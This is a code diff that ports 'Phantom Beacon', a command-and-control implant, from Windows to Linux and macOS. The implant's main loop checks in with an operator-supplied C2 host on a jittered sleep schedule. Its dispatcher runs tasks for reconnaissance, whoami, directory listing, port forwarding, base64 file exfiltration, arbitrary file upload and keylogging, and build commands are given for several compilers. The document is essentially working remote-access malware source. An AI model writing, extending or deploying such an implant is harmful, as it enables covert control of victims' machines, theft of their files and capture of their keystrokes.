@@ -1,20 +1,33 @@
 // ============================================================================
-//  main.cpp — Phantom Beacon Entry Point
-//  ──────────────────────────────────────
+//  main.cpp — Phantom Beacon Entry Point (Cross-Platform)
+//  ──────────────────────────────────────────────────────────
 //  Beacon loop: check-in → receive tasks → execute → send results → sleep.
 //
-//  Build (MinGW-w64):
+//  Build (Windows - MinGW-w64):
 //    x86_64-w64-mingw32-g++ -std=c++17 -O2 -s -o beacon.exe main.cpp \
 //        -lwinhttp -lbcrypt -lws2_32 -static
 //
-//  Build (MSVC):
+//  Build (Windows - MSVC):
 //    cl /EHsc /O2 /std:c++17 main.cpp /link winhttp.lib bcrypt.lib ws2_32.lib
+//
+//  Build (Linux / macOS):
+//    g++ -std=c++17 -O2 -s -o beacon main.cpp -lcurl -lssl -lcrypto -lpthread
 // ============================================================================
 
-#ifndef WIN32_LEAN_AND_MEAN
-#define WIN32_LEAN_AND_MEAN
+#ifdef _WIN32
+    #ifndef WIN32_LEAN_AND_MEAN
+    #define WIN32_LEAN_AND_MEAN
+    #endif
+    #include <windows.h>
+#else
+    #include <unistd.h>
+    #include <sys/utsname.h>
+    #include <fstream>
+    #include <chrono>
+    #include <thread>
+    #include <cstring>
+    #define Sleep(ms) std::this_thread::sleep_for(std::chrono::milliseconds(ms))
 #endif
-#include <windows.h>
 #include <cstdlib>
 #include <ctime>
 #include <string>
@@ -106,13 +119,11 @@ std::string dispatch_command(const std::string& cmd) {
     iss >> action;
 
     if (action == "recon") {
-        // recon [path]
         std::string path;
         std::getline(iss >> std::ws, path);
         return recon::format_human(path);
     }
     else if (action == "ls" || action == "dir") {
-        // ls <path>
         std::string path;
         std::getline(iss >> std::ws, path);
         if (path.empty()) path = ".";
@@ -138,14 +149,21 @@ std::string dispatch_command(const std::string& cmd) {
         return out.str();
     }
     else if (action == "whoami") {
+#ifdef _WIN32
         char user[256], computer[256];
         DWORD usize = sizeof(user), csize = sizeof(computer);
         GetUserNameA(user, &usize);
         GetComputerNameA(computer, &csize);
         return std::string("User: ") + user + "\nComputer: " + computer + "\n";
+#else
+        char hostname[256] = {0};
+        gethostname(hostname, sizeof(hostname));
+        const char* user = getenv("USER");
+        if (!user) user = "unknown";
+        return std::string("User: ") + user + "\nHostname: " + hostname + "\n";
+#endif
     }
     else if (action == "portfwd") {
-        // portfwd <local_port> <remote_host> <remote_port>
         int localPort, remotePort;
         std::string remoteHost;
         if (iss >> localPort >> remoteHost >> remotePort) {
@@ -157,11 +175,11 @@ std::string dispatch_command(const std::string& cmd) {
         return portfwd::stop_all_forwards();
     }
     else if (action == "download") {
-        // download <filepath> — read a file and return its contents (base64)
         std::string filepath;
         std::getline(iss >> std::ws, filepath);
         if (filepath.empty()) return "Usage: download <filepath>";
 
+#ifdef _WIN32
         HANDLE hFile = CreateFileA(filepath.c_str(), GENERIC_READ, FILE_SHARE_READ,
             nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
         if (hFile == INVALID_HANDLE_VALUE)
@@ -180,15 +198,29 @@ std::string dispatch_command(const std::string& cmd) {
 
         buffer.resize(bytesRead);
         return "FILE_B64:" + crypto::base64_encode(buffer);
+#else
+        std::ifstream file(filepath, std::ios::binary);
+        if (!file) return "Error: Cannot open file " + filepath;
+
+        file.seekg(0, std::ios::end);
+        size_t fileSize = file.tellg();
+        if (fileSize > 10 * 1024 * 1024) return "Error: File too large";
+        file.seekg(0, std::ios::beg);
+
+        std::vector<BYTE> buffer(fileSize);
+        file.read(reinterpret_cast<char*>(buffer.data()), fileSize);
+        buffer.resize(file.gcount());
+        return "FILE_B64:" + crypto::base64_encode(buffer);
+#endif
     }
     else if (action == "upload") {
-        // upload <filepath> <base64_data>
         std::string filepath, b64data;
         iss >> filepath >> b64data;
         if (filepath.empty() || b64data.empty())
             return "Usage: upload <filepath> <base64_data>";
 
         auto data = crypto::base64_decode(b64data);
+#ifdef _WIN32
         HANDLE hFile = CreateFileA(filepath.c_str(), GENERIC_WRITE, 0,
             nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
         if (hFile == INVALID_HANDLE_VALUE)
@@ -198,9 +230,15 @@ std::string dispatch_command(const std::string& cmd) {
         WriteFile(hFile, data.data(), static_cast<DWORD>(data.size()), &bytesWritten, nullptr);
         CloseHandle(hFile);
         return "Uploaded " + std::to_string(bytesWritten) + " bytes to " + filepath;
+#else
+        std::ofstream file(filepath, std::ios::binary);
+        if (!file) return "Error: Cannot create file " + filepath;
+
+        file.write(reinterpret_cast<const char*>(data.data()), data.size());
+        return "Uploaded " + std::to_string(data.size()) + " bytes to " + filepath;
+#endif
     }
     else if (action == "sleep") {
-        // sleep <ms> — change beacon sleep interval (handled by caller)
         return "SLEEP_SET";
     }
     else if (action == "keylog") {
@@ -222,28 +260,35 @@ std::string dispatch_command(const std::string& cmd) {
 // ── Generate Beacon ID ─────────────────────────────────────────────────────
 
 std::string generate_beacon_id() {
-    // Format: PHANTOM-<computername>-<random4hex>
+#ifdef _WIN32
     char computer[256];
     DWORD csize = sizeof(computer);
     GetComputerNameA(computer, &csize);
-
     char hex[9];
     srand(static_cast<unsigned>(time(nullptr)) ^ GetCurrentProcessId());
     snprintf(hex, sizeof(hex), "%04X%04X", rand() & 0xFFFF, rand() & 0xFFFF);
-
     return std::string("PHANTOM-") + computer + "-" + hex;
+#else
+    char hostname[256] = {0};
+    gethostname(hostname, sizeof(hostname));
+    char hex[9];
+    srand(static_cast<unsigned>(time(nullptr)) ^ getpid());
+    snprintf(hex, sizeof(hex), "%04X%04X", rand() & 0xFFFF, rand() & 0xFFFF);
+    return std::string("PHANTOM-") + hostname + "-" + hex;
+#endif
 }
 
 
-// ── Main Beacon Loop ───────────────────────────────────────────────────────
+// ── Beacon Main Loop ──────────────────────────────────────────────────────
 
-int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR lpCmdLine, int) {
-    // Seed RNG for jitter and user-agent rotation
+void beacon_main(int argc, char** argv) {
+#ifdef _WIN32
     srand(static_cast<unsigned>(time(nullptr)) ^ GetCurrentProcessId());
-
-    // Initialize Winsock (required for portfwd)
     WSADATA wsa;
     WSAStartup(MAKEWORD(2, 2), &wsa);
+#else
+    srand(static_cast<unsigned>(time(nullptr)) ^ getpid());
+#endif
 
     // Configure C2 connection
     net::C2Config cfg;
@@ -251,15 +296,10 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR lpCmdLine, int) {
     cfg.sleep_ms  = 5000;   // 5 second base interval
     cfg.jitter    = 30;     // ±30% jitter
 
-    // Parse command line for C2 host:port (e.g., "beacon.exe 192.168.1.100 8443")
-    if (lpCmdLine && strlen(lpCmdLine) > 0) {
-        std::istringstream args(lpCmdLine);
-        std::string host;
-        int port = 443;
-        if (args >> host) {
-            cfg.host = std::wstring(host.begin(), host.end());
-            if (args >> port) cfg.port = port;
-        }
+    // Parse command line for C2 host:port (e.g., "beacon 192.168.1.100 8443")
+    if (argc >= 2) {
+        cfg.host = std::wstring(std::string(argv[1]).begin(), std::string(argv[1]).end());
+        if (argc >= 3) cfg.port = std::atoi(argv[2]);
     }
 
     // ── Beacon Loop ────────────────────────────────────────────────────────
@@ -282,7 +322,6 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR lpCmdLine, int) {
                     break;
                 }
                 if (output == "SLEEP_SET") {
-                    // Parse new sleep value from command
                     std::istringstream iss(task.command);
                     std::string _; int newSleep;
                     iss >> _ >> newSleep;
@@ -305,6 +344,39 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR lpCmdLine, int) {
 
     // Cleanup
     portfwd::stop_all_forwards();
+#ifdef _WIN32
     WSACleanup();
+#endif
+}
+
+
+// ── Entry Point ────────────────────────────────────────────────────────────
+
+#ifdef _WIN32
+int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR lpCmdLine, int) {
+    // Convert lpCmdLine to argc/argv
+    int argc = 0;
+    char** argv = nullptr;
+    
+    // Simple parsing: split lpCmdLine by spaces
+    std::vector<std::string> args;
+    args.push_back("beacon.exe");
+    if (lpCmdLine && strlen(lpCmdLine) > 0) {
+        std::istringstream iss(lpCmdLine);
+        std::string token;
+        while (iss >> token) args.push_back(token);
+    }
+    
+    std::vector<char*> argv_ptrs;
+    for (auto& a : args) argv_ptrs.push_back(&a[0]);
+    
+    beacon_main(static_cast<int>(argv_ptrs.size()), argv_ptrs.data());
     return 0;
 }
+#else
+int main(int argc, char** argv) {
+    beacon_main(argc, argv);
+    return 0;
+}
+#endif
+
